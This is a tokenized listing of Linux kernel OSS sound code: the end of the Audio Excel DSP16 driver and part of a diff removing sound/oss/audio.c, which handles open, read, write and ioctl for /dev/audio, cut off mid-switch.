"(\"", "Initializing", "BASE", "[", "0x", "%", "x", "]", "IRQ", "[", "%", "d", "]", "DMA", "[", "%", "d", "]", "MIRQ", "[", "%", "d", "]", "\\", "n", "\"", ",", "ae_config", ".", "base_io", ",", "ae_config", ".", "irq", ",", "ae_config", ".", "dma", ",", "ae_config", ".", "mpu_irq", ")", ");", "if", "(", "ae_config", ".", "mss_base", "=", "=", "-", "1", ")", "{", "if", "(", "init_aedsp16_sb", "(", ")", "=", "=", "FALSE", ")", "{", "uninit_aedsp16_sb", "(", ");", "}", "else", "{", "initialized", "=", "TRUE", ";", "}", "}", "if", "(", "ae_config", ".", "mpu_base", "!", "=", "-", "1", ")", "{", "if", "(", "init_aedsp16_mpu", "(", ")", "=", "=", "FALSE", ")", "{", "uninit_aedsp16_mpu", "(", ");", "}", "else", "{", "initialized", "=", "TRUE", ";", "}", "}", "/", "*", "*", "In", "the", "sequence", "of", "init", "routines", ",", "the", "MSS", "init", "MUST", "be", "the", "last", "!", "*", "This", "because", "of", "the", "special", "register", "programming", "the", "MSS", "mode", "needs", ".", "*", "A", "board", "reset", "would", "disable", "the", "MSS", "mode", "restoring", "the", "default", "SBPRO", "*", "mode", ".", "*", "/", "if", "(", "ae_config", ".", "mss_base", "!", "=", "-", "1", ")", "{", "if", "(", "init_aedsp16_mss", "(", ")", "=", "=", "FALSE", ")", "{", "uninit_aedsp16_mss", "(", ");", "}", "else", "{", "initialized", "=", "TRUE", ";", "}", "}", "if", "(", "initialized", ")", "initialized", "=", "aedsp16_init_board", "(", ");", "return", "initialized", ";", "}", "static", "void", "__exit", "uninit_aedsp16", "(", "void", ")", "{", "if", "(", "ae_config", ".", "mss_base", "!", "=", "-", "1", ")", "uninit_aedsp16_mss", "(", ");", "else", "uninit_aedsp16_sb", "(", ");", "if", "(", "ae_config", ".", "mpu_base", "!", "=", "-", "1", ")", "uninit_aedsp16_mpu", "(", ");", "}", "static", "int", "__initdata", "io", "=", "-", "1", ";", "static", "int", "__initdata", "irq", "=", "-", "1", ";", "static", "int", "__initdata", "dma", "=", "-", "1", ";", "static", "int", "__initdata", "mpu_irq", "=", "-", "1", ";", "static", "int", "__initdata", "mss_base", "=", "-", "1", ";", "static", "int", "__initdata", "mpu_base", "=", "-", "1", ";", "module_param_hw", "(", "io", ",", "int", ",", "ioport", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "io", ",", "\"", "I", "/", "O", "base", "address", "(", "0x220", "0x240", ")", "\")", ";", "module_param_hw", "(", "irq", ",", "int", ",", "irq", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "irq", ",", "\"", "IRQ", "line", "(", "5", "7", "9", "10", "11", ")", "\")", ";", "module_param_hw", "(", "dma", ",", "int", ",", "dma", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "dma", ",", "\"", "dma", "line", "(", "0", "1", "3", ")", "\")", ";", "module_param_hw", "(", "mpu_irq", ",", "int", ",", "irq", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "mpu_irq", ",", "\"", "MPU", "-", "401", "IRQ", "line", "(", "5", "7", "9", "10", "0", ")", "\")", ";", "module_param_hw", "(", "mss_base", ",", "int", ",", "ioport", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "mss_base", ",", "\"", "MSS", "emulation", "I", "/", "O", "base", "address", "(", "0x530", "0xE80", ")", "\")", ";", "module_param_hw", "(", "mpu_base", ",", "int", ",", "ioport", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "mpu_base", ",", "\"", "MPU", "-", "401", "I", "/", "O", "base", "address", "(", "0x300", "0x310", "0x320", "0x330", ")", "\")", ";", "MODULE_AUTHOR", "(", "\"", "Riccardo", "Facchetti", "<", "fizban", "@", "tin", ".", "it", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "Audio", "Excel", "DSP", "16", "Driver", "Version", "\"", "VERSION", ")", ";", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "static", "int", "__init", "do_init_aedsp16", "(", "void", ")", "{", "printk", "(", "\"", "Audio", "Excel", "DSP", "16", "init", "driver", "Copyright", "(", "C", ")", "Riccardo", "Facchetti", "1995", "-", "98", "\\", "n", "\"", ");", "if", "(", "io", "=", "=", "-", "1", "|", "|", "dma", "=", "=", "-", "1", "|", "|", "irq", "=", "=", "-", "1", ")", "{", "printk", "(", "KERN_INFO", "\"", "aedsp16", ":", "I", "/", "O", ",", "IRQ", "and", "DMA", "are", "mandatory", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "ae_config", ".", "base_io", "=", "io", ";", "ae_config", ".", "irq", "=", "irq", ";", "ae_config", ".", "dma", "=", "dma", ";", "ae_config", ".", "mss_base", "=", "mss_base", ";", "ae_config", ".", "mpu_base", "=", "mpu_base", ";", "ae_config", ".", "mpu_irq", "=", "mpu_irq", ";", "if", "(", "init_aedsp16", "(", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "KERN_ERR", "\"", "aedsp16", ":", "initialization", "failed", "\\", "n", "\"", ");", "/", "*", "*", "XXX", "*", "What", "error", "should", "we", "return", "here", "?", "*", "/", "return", "-", "EINVAL", ";", "}", "return", "0", ";", "}", "static", "void", "__exit", "cleanup_aedsp16", "(", "void", ")", "{", "uninit_aedsp16", "(", ");", "}", "module_init", "(", "do_init_aedsp16", ")", ";", "module_exit", "(", "cleanup_aedsp16", ")", ";", "#", "ifndef", "MODULE", "static", "int", "__init", "setup_aedsp16", "(", "char", "*", "str", ")", "{", "/", "*", "io", ",", "irq", ",", "dma", ",", "mss_io", ",", "mpu_io", ",", "mpu_irq", "*", "/", "int", "ints", "[", "7", "]", ";", "str", "=", "get_options", "(", "str", ",", "ARRAY_SIZE", "(", "ints", ")", ",", "ints", ")", ";", "io", "=", "ints", "[", "1", "]", ";", "irq", "=", "ints", "[", "2", "]", ";", "dma", "=", "ints", "[", "3", "]", ";", "mss_base", "=", "ints", "[", "4", "]", ";", "mpu_base", "=", "ints", "[", "5", "]", ";", "mpu_irq", "=", "ints", "[", "6", "]", ";", "return", "1", ";", "}", "__setup", "(", "\"", "aedsp16", "=", "\",", "setup_aedsp16", ")", ";", "#", "endif", "@", "@", "-", "1", ",", "985", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "audio", ".", "c", "*", "*", "Device", "file", "manager", "for", "/", "dev", "/", "audio", "*", "/", "/", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "/", "/", "*", "*", "Thomas", "Sailer", ":", "ioctl", "code", "reworked", "(", "vmalloc", "/", "vfree", "removed", ")", "*", "Thomas", "Sailer", ":", "moved", "several", "static", "variables", "into", "struct", "audio_operations", "*", "(", "which", "is", "grossly", "misnamed", "btw", ".", ")", "because", "they", "have", "the", "same", "*", "lifetime", "as", "the", "rest", "in", "there", "and", "dynamic", "allocation", "saves", "*", "12k", "or", "so", "*", "Thomas", "Sailer", ":", "use", "more", "logical", "O_NONBLOCK", "semantics", "*", "Daniel", "Rodriksson", ":", "reworked", "the", "use", "of", "the", "device", "specific", "copy_user", "*", "still", "generic", "*", "Horst", "von", "Brand", ":", "Add", "missing", "#", "include", "<", "linux", "/", "string", ".", "h", ">", "*", "Chris", "Rankin", ":", "Update", "the", "module", "-", "usage", "counter", "for", "the", "coprocessor", ",", "*", "and", "decrement", "the", "counters", "again", "if", "we", "cannot", "open", "*", "the", "audio", "device", ".", "*", "/", "#", "include", "<", "linux", "/", "stddef", ".", "h", ">", "#", "include", "<", "linux", "/", "string", ".", "h", ">", "#", "include", "<", "linux", "/", "kmod", ".", "h", ">", "#", "include", "\"", "sound_config", ".", "h", "\"", "#", "include", "\"", "ulaw", ".", "h", "\"", "#", "include", "\"", "coproc", ".", "h", "\"", "#", "define", "NEUTRAL8", "0x80", "#", "define", "NEUTRAL16", "0x00", "static", "int", "dma_ioctl", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", ";", "static", "int", "set_format", "(", "int", "dev", ",", "int", "fmt", ")", "{", "if", "(", "fmt", "!", "=", "AFMT_QUERY", ")", "{", "audio_devs", "[", "dev", "]", "->", "local_conversion", "=", "0", ";", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "format_mask", "&", "fmt", ")", ")", "/", "*", "Not", "supported", "*", "/", "{", "if", "(", "fmt", "=", "=", "AFMT_MU_LAW", ")", "{", "fmt", "=", "AFMT_U8", ";", "audio_devs", "[", "dev", "]", "->", "local_conversion", "=", "CNV_MU_LAW", ";", "}", "else", "fmt", "=", "AFMT_U8", ";", "/", "*", "This", "is", "always", "supported", "*", "/", "}", "audio_devs", "[", "dev", "]", "->", "audio_format", "=", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "set_bits", "(", "dev", ",", "fmt", ")", ";", "audio_devs", "[", "dev", "]", "->", "local_format", "=", "fmt", ";", "}", "else", "return", "audio_devs", "[", "dev", "]", "->", "local_format", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "local_conversion", ")", "return", "audio_devs", "[", "dev", "]", "->", "local_conversion", ";", "else", "return", "audio_devs", "[", "dev", "]", "->", "local_format", ";", "}", "int", "audio_open", "(", "int", "dev", ",", "struct", "file", "*", "file", ")", "{", "int", "ret", ";", "int", "bits", ";", "int", "dev_type", "=", "dev", "&", "0x0f", ";", "int", "mode", "=", "translate_mode", "(", "file", ")", ";", "const", "struct", "audio_driver", "*", "driver", ";", "const", "struct", "coproc_operations", "*", "coprocessor", ";", "dev", "=", "dev", ">", ">", "4", ";", "if", "(", "dev_type", "=", "=", "SND_DEV_DSP16", ")", "bits", "=", "16", ";", "else", "bits", "=", "8", ";", "if", "(", "dev", "<", "0", "|", "|", "dev", ">", "=", "num_audiodevs", ")", "return", "-", "ENXIO", ";", "driver", "=", "audio_devs", "[", "dev", "]", "->", "d", ";", "if", "(", "!", "try_module_get", "(", "driver", "-", ">", "owner", ")", ")", "return", "-", "ENODEV", ";", "if", "(", "(", "ret", "=", "DMAbuf_open", "(", "dev", ",", "mode", ")", ")", "<", "0", ")", "goto", "error_1", ";", "if", "(", "(", "coprocessor", "=", "audio_devs", "[", "dev", "]", "->", "coproc", ")", "!", "=", "NULL", ")", "{", "if", "(", "!", "try_module_get", "(", "coprocessor", "-", ">", "owner", ")", ")", "goto", "error_2", ";", "if", "(", "(", "ret", "=", "coprocessor", "-", ">", "open", "(", "coprocessor", "-", ">", "devc", ",", "COPR_PCM", ")", ")", "<", "0", ")", "{", "printk", "(", "KERN_WARNING", "\"", "Sound", ":", "Can", "'", "t", "access", "coprocessor", "device", "\\", "n", "\"", ");", "goto", "error_3", ";", "}", "}", "audio_devs", "[", "dev", "]", "->", "local_conversion", "=", "0", ";", "if", "(", "dev_type", "=", "=", "SND_DEV_AUDIO", ")", "set_format", "(", "dev", ",", "AFMT_MU_LAW", ")", ";", "else", "set_format", "(", "dev", ",", "bits", ")", ";", "audio_devs", "[", "dev", "]", "->", "audio_mode", "=", "AM_NONE", ";", "return", "0", ";", "/", "*", "*", "Clean", "-", "up", "stack", ":", "this", "is", "what", "needs", "(", "un", ")", "doing", "if", "*", "we", "can", "'", "t", "open", "the", "audio", "device", ".", "..", "*", "/", "error_3", ":", "module_put", "(", "coprocessor", "-", ">", "owner", ")", ";", "error_2", ":", "DMAbuf_release", "(", "dev", ",", "mode", ")", ";", "error_1", ":", "module_put", "(", "driver", "-", ">", "owner", ")", ";", "return", "ret", ";", "}", "static", "void", "sync_output", "(", "int", "dev", ")", "{", "int", "p", ",", "i", ";", "int", "l", ";", "struct", "dma_buffparms", "*", "dmap", "=", "audio_devs", "[", "dev", "]", "->", "dmap_out", ";", "if", "(", "dmap", "-", ">", "fragment_size", "<", "=", "0", ")", "return", ";", "dmap", "-", ">", "flags", "|", "=", "DMA_POST", ";", "/", "*", "Align", "the", "write", "pointer", "with", "fragment", "boundaries", "*", "/", "if", "(", "(", "l", "=", "dmap", "-", ">", "user_counter", "%", "dmap", "-", ">", "fragment_size", ")", ">", "0", ")", "{", "int", "len", ";", "unsigned", "long", "offs", "=", "dmap", "-", ">", "user_counter", "%", "dmap", "-", ">", "bytes_in_use", ";", "len", "=", "dmap", "-", ">", "fragment_size", "-", "l", ";", "memset", "(", "dmap", "-", ">", "raw_buf", "+", "offs", ",", "dmap", "-", ">", "neutral_byte", ",", "len", ")", ";", "DMAbuf_move_wrpointer", "(", "dev", ",", "len", ")", ";", "}", "/", "*", "*", "Clean", "all", "unused", "buffer", "fragments", ".", "*", "/", "p", "=", "dmap", "-", ">", "qtail", ";", "dmap", "-", ">", "flags", "|", "=", "DMA_POST", ";", "for", "(", "i", "=", "dmap", "-", ">", "qlen", "+", "1", ";", "i", "<", "dmap", "-", ">", "nbufs", ";", "i", "+", "+)", "{", "p", "=", "(", "p", "+", "1", ")", "%", "dmap", "-", ">", "nbufs", ";", "if", "(", "((", "dmap", "-", ">", "raw_buf", "+", "p", "*", "dmap", "-", ">", "fragment_size", ")", "+", "dmap", "-", ">", "fragment_size", ")", ">", "(", "dmap", "-", ">", "raw_buf", "+", "dmap", "-", ">", "buffsize", ")", ")", "printk", "(", "KERN_ERR", "\"", "audio", ":", "Buffer", "error", "2", "\\", "n", "\"", ");", "memset", "(", "dmap", "-", ">", "raw_buf", "+", "p", "*", "dmap", "-", ">", "fragment_size", ",", "dmap", "-", ">", "neutral_byte", ",", "dmap", "-", ">", "fragment_size", ")", ";", "}", "dmap", "-", ">", "flags", "|", "=", "DMA_DIRTY", ";", "}", "void", "audio_release", "(", "int", "dev", ",", "struct", "file", "*", "file", ")", "{", "const", "struct", "coproc_operations", "*", "coprocessor", ";", "int", "mode", "=", "translate_mode", "(", "file", ")", ";", "dev", "=", "dev", ">", ">", "4", ";", "/", "*", "*", "We", "do", "this", "in", "DMAbuf_release", "(", ").", "Why", "are", "we", "doing", "it", "*", "here", "?", "Why", "don", "'", "t", "we", "test", "the", "file", "mode", "before", "setting", "*", "both", "flags", "?", "DMAbuf_release", "(", ")", "does", ".", "*", ".", "..", "pester", ".", "..", "pester", ".", "..", "pester", ".", "..", "*", "/", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "closing", "=", "1", ";", "audio_devs", "[", "dev", "]", "->", "dmap_in", "-", ">", "closing", "=", "1", ";", "/", "*", "*", "We", "need", "to", "make", "sure", "we", "allocated", "the", "dmap_out", "buffer", "*", "before", "we", "go", "mucking", "around", "with", "it", "in", "sync_output", "(", ").", "*", "/", "if", "(", "mode", "&", "OPEN_WRITE", ")", "sync_output", "(", "dev", ")", ";", "if", "(", "(", "coprocessor", "=", "audio_devs", "[", "dev", "]", "->", "coproc", ")", "!", "=", "NULL", ")", "{", "coprocessor", "-", ">", "close", "(", "coprocessor", "-", ">", "devc", ",", "COPR_PCM", ")", ";", "module_put", "(", "coprocessor", "-", ">", "owner", ")", ";", "}", "DMAbuf_release", "(", "dev", ",", "mode", ")", ";", "module_put", "(", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "owner", ")", ";", "}", "static", "void", "translate_bytes", "(", "const", "unsigned", "char", "*", "table", ",", "unsigned", "char", "*", "buff", ",", "int", "n", ")", "{", "unsigned", "long", "i", ";", "if", "(", "n", "<", "=", "0", ")", "return", ";", "for", "(", "i", "=", "0", ";", "i", "<", "n", ";", "+", "+", "i", ")", "buff", "[", "i", "]", "=", "table", "[", "buff", "[", "i", "]", "];", "}", "int", "audio_write", "(", "int", "dev", ",", "struct", "file", "*", "file", ",", "const", "char", "__user", "*", "buf", ",", "int", "count", ")", "{", "int", "c", ",", "p", ",", "l", ",", "buf_size", ",", "used", ",", "returned", ";", "int", "err", ";", "char", "*", "dma_buf", ";", "dev", "=", "dev", ">", ">", "4", ";", "p", "=", "0", ";", "c", "=", "count", ";", "if", "(", "count", "<", "0", ")", "return", "-", "EINVAL", ";", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", ")", "return", "-", "EPERM", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", ")", "audio_devs", "[", "dev", "]", "->", "audio_mode", "|", "=", "AM_WRITE", ";", "else", "audio_devs", "[", "dev", "]", "->", "audio_mode", "=", "AM_WRITE", ";", "if", "(", "!", "count", ")", "/", "*", "Flush", "output", "*", "/", "{", "sync_output", "(", "dev", ")", ";", "return", "0", ";", "}", "while", "(", "c", ")", "{", "if", "(", "(", "err", "=", "DMAbuf_getwrbuffer", "(", "dev", ",", "&", "dma_buf", ",", "&", "buf_size", ",", "!", "!(", "file", "-", ">", "f_flags", "&", "O_NONBLOCK", ")", "))", "<", "0", ")", "{", "/", "*", "Handle", "nonblocking", "mode", "*", "/", "if", "(", "(", "file", "-", ">", "f_flags", "&", "O_NONBLOCK", ")", "&", "&", "err", "=", "=", "-", "EAGAIN", ")", "return", "p", "?", "p", ":", "-", "EAGAIN", ";", "/", "*", "No", "more", "space", ".", "Return", "#", "of", "accepted", "bytes", "*", "/", "return", "err", ";", "}", "l", "=", "c", ";", "if", "(", "l", ">", "buf_size", ")", "l", "=", "buf_size", ";", "returned", "=", "l", ";", "used", "=", "l", ";", "if", "(", "!", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "copy_user", ")", "{", "if", "(", "(", "dma_buf", "+", "l", ")", ">", "(", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "raw_buf", "+", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "buffsize", ")", ")", "{", "printk", "(", "KERN_ERR", "\"", "audio", ":", "Buffer", "error", "3", "(", "%", "lx", ",", "%", "d", ")", ",", "(", "%", "lx", ",", "%", "d", ")", "\\", "n", "\"", ",", "(", "long", ")", "dma_buf", ",", "l", ",", "(", "long", ")", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "raw_buf", ",", "(", "int", ")", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "buffsize", ")", ";", "return", "-", "EDOM", ";", "}", "if", "(", "dma_buf", "<", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "raw_buf", ")", "{", "printk", "(", "KERN_ERR", "\"", "audio", ":", "Buffer", "error", "13", "(", "%", "lx", "<", "%", "lx", ")", "\\", "n", "\"", ",", "(", "long", ")", "dma_buf", ",", "(", "long", ")", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "raw_buf", ")", ";", "return", "-", "EDOM", ";", "}", "if", "(", "copy_from_user", "(", "dma_buf", ",", "&", "(", "buf", ")", "[", "p", "]", ",", "l", ")", ")", "return", "-", "EFAULT", ";", "}", "else", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "copy_user", "(", "dev", ",", "dma_buf", ",", "0", ",", "buf", ",", "p", ",", "c", ",", "buf_size", ",", "&", "used", ",", "&", "returned", ",", "l", ")", ";", "l", "=", "returned", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "local_conversion", "&", "CNV_MU_LAW", ")", "{", "translate_bytes", "(", "ulaw_dsp", ",", "(", "unsigned", "char", "*", ")", "dma_buf", ",", "l", ")", ";", "}", "c", "-", "=", "used", ";", "p", "+", "=", "used", ";", "DMAbuf_move_wrpointer", "(", "dev", ",", "l", ")", ";", "}", "return", "count", ";", "}", "int", "audio_read", "(", "int", "dev", ",", "struct", "file", "*", "file", ",", "char", "__user", "*", "buf", ",", "int", "count", ")", "{", "int", "c", ",", "p", ",", "l", ";", "char", "*", "dmabuf", ";", "int", "buf_no", ";", "dev", "=", "dev", ">", ">", "4", ";", "p", "=", "0", ";", "c", "=", "count", ";", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_READ", ")", ")", "return", "-", "EPERM", ";", "if", "(", "(", "audio_devs", "[", "dev", "]", "->", "audio_mode", "&", "AM_WRITE", ")", "&", "&", "!", "(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", ")", ")", "sync_output", "(", "dev", ")", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", ")", "audio_devs", "[", "dev", "]", "->", "audio_mode", "|", "=", "AM_READ", ";", "else", "audio_devs", "[", "dev", "]", "->", "audio_mode", "=", "AM_READ", ";", "while", "(", "c", ")", "{", "if", "(", "(", "buf_no", "=", "DMAbuf_getrdbuffer", "(", "dev", ",", "&", "dmabuf", ",", "&", "l", ",", "!", "!(", "file", "-", ">", "f_flags", "&", "O_NONBLOCK", ")", "))", "<", "0", ")", "{", "/", "*", "*", "Nonblocking", "mode", "handling", ".", "Return", "current", "#", "of", "bytes", "*", "/", "if", "(", "p", ">", "0", ")", "/", "*", "Avoid", "throwing", "away", "data", "*", "/", "return", "p", ";", "/", "*", "Return", "it", "instead", "*", "/", "if", "(", "(", "file", "-", ">", "f_flags", "&", "O_NONBLOCK", ")", "&", "&", "buf_no", "=", "=", "-", "EAGAIN", ")", "return", "-", "EAGAIN", ";", "return", "buf_no", ";", "}", "if", "(", "l", ">", "c", ")", "l", "=", "c", ";", "/", "*", "*", "Insert", "any", "local", "processing", "here", ".", "*", "/", "if", "(", "audio_devs", "[", "dev", "]", "->", "local_conversion", "&", "CNV_MU_LAW", ")", "{", "translate_bytes", "(", "dsp_ulaw", ",", "(", "unsigned", "char", "*", ")", "dmabuf", ",", "l", ")", ";", "}", "{", "char", "*", "fixit", "=", "dmabuf", ";", "if", "(", "copy_to_user", "(", "&(", "buf", ")", "[", "p", "]", ",", "fixit", ",", "l", ")", ")", "return", "-", "EFAULT", ";", "}", "DMAbuf_rmchars", "(", "dev", ",", "buf_no", ",", "l", ")", ";", "p", "+", "=", "l", ";", "c", "-", "=", "l", ";", "}", "return", "count", "-", "c", ";", "}", "int", "audio_ioctl", "(", "int", "dev", ",", "struct", "file", "*", "file", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", "{", "int", "val", ",", "count", ";", "unsigned", "long", "flags", ";", "struct", "dma_buffparms", "*", "dmap", ";", "int", "__user", "*", "p", "=", "arg", ";", "dev", "=", "dev", ">", ">", "4", ";", "if", "(", "_IOC_TYPE", "(", "cmd", ")", "=", "=", "'", "C", "'", ")", "{", "if", "(", "audio_devs", "[", "dev", "]", "->", "coproc", ")", "/", "*", "Coprocessor", "ioctl", "*", "/", "return", "audio_devs", "[", "dev", "]", "->", "coproc", "-", ">", "ioctl", "(", "audio_devs", "[", "dev", "]", "->", "coproc", "-", ">", "devc", ",", "cmd", ",", "arg", ",", "0", ")", ";", "/", "*", "else", "printk", "(", "KERN_DEBUG", "\"", "/", "dev", "/", "dsp", "%", "d", ":", "No", "coprocessor", "for", "this", "device", "\\", "n", "\"", ",", "dev", ")", ";", "*", "/", "return", "-", "ENXIO", ";", "}", "else", "switch", "(", "cmd", ")", "{", "case", "SNDCTL_DSP_SYNC", ":", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", ")", "return", "0", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "fragment_size", "=", "=", "0", ")", "return", "0", ";", "sync_output", "(", "dev", ")", ";", "DMAbuf_sync", "(", "dev", ")", ";", "DMAbuf_reset", "(", "dev", ")", ";", "return", "0", ";", "case", "SNDCTL_DSP_POST", ":", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", ")", "return", "0", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "fragment_size", "=", "=", "0", ")", "return", "0", ";", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "flags", "|", "=", "DMA_POST", "|", "DMA_DIRTY", ";", "sync_output", "(", "dev", ")", ";", "dma_ioctl", "(", "dev", ",", "SNDCTL_DSP_POST", ",", "NULL", ")", ";", "return", "0", ";", "case", "SNDCTL_DSP_RESET", ":", "audio_devs", "[", "dev", "]", "->", "audio_mode", "=", "AM_NONE", ";", "DMAbuf_reset", "(", "dev", ")", ";", "return", "0", ";", "case", "SNDCTL_DSP_GETFMTS", ":", "val", "=", "audio_devs", "[", "dev", "]", "->", "format_mask", "|", "AFMT_MU_LAW", ";", "break", ";", "case", "SNDCTL_DSP_SETFMT", ":", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "val", "=", "set_format", "(", "dev", ",", "val", ")", ";", "break", ";", "case", "SNDCTL_DSP_GETISPACE", ":", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_READ", ")", ")", "return", "0", ";", "if", "(", "(", "audio_devs", "[", "dev", "]", "->", "audio_mode", "&", "AM_WRITE", ")", "&", "&", "!", "(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", ")", ")", "return", "-", "EBUSY", ";", "return", "dma_ioctl", "(", "dev", ",", "cmd", ",", "arg", ")", ";", "case", "SNDCTL_DSP_GETOSPACE", ":", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", ")", "return", "-", "EPERM", ";", "if", "(", "(", "audio_devs", "[", "dev", "]", "->", "audio_mode", "&", "AM_READ", ")", "&", "&", "!", "(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", ")", ")", "return", "-", "EBUSY", ";", "return", "dma_ioctl", "(", "dev", ",", "cmd", ",", "arg", ")", ";", "case", "SNDCTL_DSP_NONBLOCK", ":", "spin_lock", "(", "&", "file", "-", ">", "f_lock", ")", ";", "file", "-", ">", "f_flags", "|", "=", "O_NONBLOCK", ";", "spin_unlock", "(", "&", "file", "-", ">", "f_lock", ")", ";", "return", "0", ";", "case", "SNDCTL_DSP_GETCAPS", ":", "val", "=", "1", "|", "DSP_CAP_MMAP", ";", "/", "*", "Revision", "level", "of", "this", "ioctl", "(", ")", "*", "/", "if", "(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", "&", "&", "audio_devs", "[", "dev", "]", "->", "open_mode", "=", "=", "OPEN_READWRITE", ")", "val", "|", "=", "DSP_CAP_DUPLEX", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "coproc", ")", "val", "|", "=", "DSP_CAP_COPROC", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "local_qlen", ")", "/", "*", "Device", "has", "hidden", "buffers", "*", "/", "val", "|", "=", "DSP_CAP_BATCH", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "trigger", ")", "/", "*", "Supports", "SETTRIGGER", "*", "/", "val", "|", "=", "DSP_CAP_TRIGGER", ";", "break", ";", "case", "SOUND_PCM_WRITE_RATE", ":", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "val", "=", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "set_speed", "(", "dev", ",", "val", ")", ";", "break", ";", "case", "SOUND_PCM_READ_RATE", ":", "val", "=", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "set_speed", "(", "dev", ",", "0", ")", ";", "break", ";", "case", "SNDCTL_DSP_STEREO", ":", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "val", ">", "1", "|", "|", "val", "<", "0", ")", "return", "-", "EINVAL", ";", "val", "=", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "set_channels", "(", "dev", ",", "val", "+", "1", ")", "-", "1", ";", "break", ";", "case", "SOUND_PCM_WRITE_CHANNELS", ":", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "val", "=", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "set_channels", "(", "dev", ",", "val", ")", ";", "break", ";", "case", "SOUND_PCM_READ_CHANNELS", ":", "val", "=", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "set_channels", "(", "dev", ",", "0", ")", ";", "break", ";", "case", "SOUND_PCM_READ_BITS", ":", "val", "=", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "set_bits", "(", "dev", ",", "0", ")", ";", "break", ";", "case", "SNDCTL_DSP_SETDUPLEX", ":", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "!", "=", "OPEN_READWRITE", ")", "return", "-", "EPERM", ";", "return", "(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", ")", "?", "0", ":", "-", "EIO", ";", "case", "SNDCTL_DSP_PROFILE", ":", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "applic_profile", "=", "val", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_READ", ")", "audio_devs", "[", "dev", "]", "->", "dmap_in", "-", ">", "applic_profile", "=", "val", ";", "return", "0", ";", "case", "SNDCTL_DSP_GETODELAY", ":", "dmap", "=", "audio_devs", "[", "dev", "]", "->", "dmap_out", ";", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", ")", "return", "-", "EINVAL", ";", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_ALLOC_DONE", ")", ")", "{", "val", "=", "0", ";", "break", ";", "}", 